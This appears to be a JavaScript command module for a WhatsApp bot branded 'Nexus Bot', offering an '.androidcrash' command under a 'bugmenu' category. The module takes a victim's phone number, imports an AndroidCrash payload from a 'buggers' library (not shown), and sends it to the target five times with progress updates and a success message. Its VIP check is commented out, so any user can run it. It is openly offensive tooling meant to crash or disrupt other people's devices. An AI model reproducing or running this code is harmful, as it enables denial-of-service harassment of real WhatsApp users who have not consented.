import { VIPQueries } from "../../database/query.js"
import { VIPHelper } from "../../whatsapp/index.js"

export default {
  name: "androidcrash",
  commands: ["androidcrash", "acrash"],
  category: "bugmenu",
  description: "Send Android Crash bugs",
  usage: ".androidcrash <phone number>",
  adminOnly: false,
  
  async execute(sock, sessionId, args, m) {
    try {
      const userTelegramId = VIPHelper.fromSessionId(sessionId)
      if (!userTelegramId) {
        await sock.sendMessage(m.chat, { text: "❌ 𝐒𝐞𝐬𝐬𝐢𝐨𝐧 𝐞𝐫𝐫𝐨𝐫\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙" }, { quoted: m })
        return
      }

      const vipStatus = await VIPQueries.isVIP(userTelegramId)
     // if (!vipStatus.isVIP) {
       // await sock.sendMessage(m.chat, { text: "❌ 𝐕𝐈𝐏 𝐚𝐜𝐜𝐞𝐬𝐬 𝐫𝐞𝐪𝐮𝐢𝐫𝐞𝐝\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙" }, { quoted: m })
       // return
    //  }

      if (!args || args.length === 0) {
        await sock.sendMessage(m.chat, { 
          text: "❌ 𝐔𝐬𝐚𝐠𝐞: .androidcrash <phone number>\n𝐄𝐱𝐚𝐦𝐩𝐥𝐞: .androidcrash 123 456 7890\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙"
        }, { quoted: m })
        return
      }

      let phoneNumber = args.join('').replace(/[^0-9]/g, '')
      
      if (!phoneNumber) {
        await sock.sendMessage(m.chat, { text: "❌ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐩𝐡𝐨𝐧𝐞 𝐧𝐮𝐦𝐛𝐞𝐫\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙" }, { quoted: m })
        return
      }

      const target = `${phoneNumber}@s.whatsapp.net`
      
      if (target === m.sender) {
        await sock.sendMessage(m.chat, { text: "❌ 𝐂𝐚𝐧𝐧𝐨𝐭 𝐚𝐭𝐭𝐚𝐜𝐤 𝐲𝐨𝐮𝐫𝐬𝐞𝐥𝐟\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙" }, { quoted: m })
        return
      }

      const targetUser = await VIPQueries.getUserByPhone(phoneNumber)
      if (targetUser && targetUser.telegram_id) {
        const targetVipStatus = await VIPQueries.isVIP(targetUser.telegram_id)
        if (targetVipStatus.isVIP) {
          await sock.sendMessage(m.chat, { text: "❌ 𝐂𝐚𝐧𝐧𝐨𝐭 𝐚𝐭𝐭𝐚𝐜𝐤 𝐕𝐈𝐏 𝐮𝐬𝐞𝐫𝐬\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙" }, { quoted: m })
          return
        }
      }

      let statusMsg = await sock.sendMessage(m.chat, { 
        text: `🌪️ 𝐌𝐚𝐭𝐫𝐢𝐱 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦 𖣂\n\n🔍 𝐕𝐞𝐫𝐢𝐟𝐲𝐢𝐧𝐠 𝐭𝐚𝐫𝐠𝐞𝐭...\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`
      }, { quoted: m })

      await sock.sendMessage(m.chat, {
        text: `🌪️ 𝐌𝐚𝐭𝐫𝐢𝐱 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦 𖣂\n\n> *𝐓𝐚𝐫𝐠𝐞𝐭:* +${phoneNumber}\n> *𝐁𝐮𝐠 𝐓𝐲𝐩𝐞:* 𝐀𝐧𝐝𝐫𝐨𝐢𝐝 𝐂𝐫𝐚𝐬𝐡\n> *𝐒𝐭𝐚𝐭𝐮𝐬:* 𝐏𝐫𝐞𝐩𝐚𝐫𝐢𝐧𝐠...\n\n\`𝐋𝐞𝐬𝐬˚𝐐𝐮𝐞𝐫𝐲\`\n🥑 𝐈𝐧𝐢𝐭𝐢𝐚𝐥𝐢𝐳𝐢𝐧𝐠 𝐚𝐭𝐭𝐚𝐜𝐤...\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`,
        edit: statusMsg.key
      })

      const { AndroidCrash } = await import("../../lib/buggers/bug.js")

      const totalBugs = 5
      const progressSteps = [
        { percent: 20, bar: "《 ██▒▒▒▒▒▒▒▒▒▒》20%" },
        { percent: 40, bar: "《 █████▒▒▒▒▒▒▒》40%" },
        { percent: 60, bar: "《 ████████▒▒▒▒》60%" },
        { percent: 80, bar: "《 ██████████▒▒》80%" },
        { percent: 100, bar: "《 ████████████》100%" }
      ]

      for (let i = 0; i < totalBugs; i++) {
        try {
          await AndroidCrash(sock, target)
          
          const currentPercent = Math.floor(((i + 1) / totalBugs) * 100)
          const currentStep = progressSteps.find(step => step.percent >= currentPercent) || progressSteps[progressSteps.length - 1]
          
          await sock.sendMessage(m.chat, {
            text: `🌪️ 𝐌𝐚𝐭𝐫𝐢𝐱 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦 𖣂\n\n> *𝐓𝐚𝐫𝐠𝐞𝐭:* +${phoneNumber}\n> *𝐁𝐮𝐠 𝐓𝐲𝐩𝐞:* 𝐀𝐧𝐝𝐫𝐨𝐢𝐝 𝐂𝐫𝐚𝐬𝐡\n> *𝐏𝐫𝐨𝐠𝐫𝐞𝐬𝐬:* ${currentStep.bar}\n\n\`𝐋𝐞𝐬𝐬˚𝐐𝐮𝐞𝐫𝐲\`\n🥑 𝐒𝐞𝐧𝐝𝐢𝐧𝐠 𝐛𝐮𝐠 𝐩𝐚𝐲𝐥𝐨𝐚𝐝...\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`,
            edit: statusMsg.key
          })
          
          await new Promise(resolve => setTimeout(resolve, 500))
        } catch (bugError) {
          console.error("[AndroidCrash] Bug error:", bugError)
        }
      }

      await sock.sendMessage(m.chat, {
        text: `🌪️ 𝐌𝐚𝐭𝐫𝐢𝐱 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦 𖣂\n\n> *𝐓𝐚𝐫𝐠𝐞𝐭:* +${phoneNumber}\n> *𝐁𝐮𝐠 𝐓𝐲𝐩𝐞:* 𝐀𝐧𝐝𝐫𝐨𝐢𝐝 𝐂𝐫𝐚𝐬𝐡\n> *𝐒𝐭𝐚𝐭𝐮𝐬:* ✅\n\n\`𝐋𝐞𝐬𝐬˚𝐐𝐮𝐞𝐫𝐲\`\n🥑 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐬𝐞𝐧𝐭 𝐭𝐨 𝐭𝐚𝐫𝐠𝐞𝐭\n\n𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 🦄\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`,
        edit: statusMsg.key
      })

      return { success: true }
    } catch (error) {
      console.error("[AndroidCrash] Error:", error)
      await sock.sendMessage(m.chat, { 
        text: `❌ 𝐀𝐭𝐭𝐚𝐜𝐤 𝐟𝐚𝐢𝐥𝐞𝐝: ${error.message}\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙` 
      }, { quoted: m })
      return { success: false }
    }
  }
}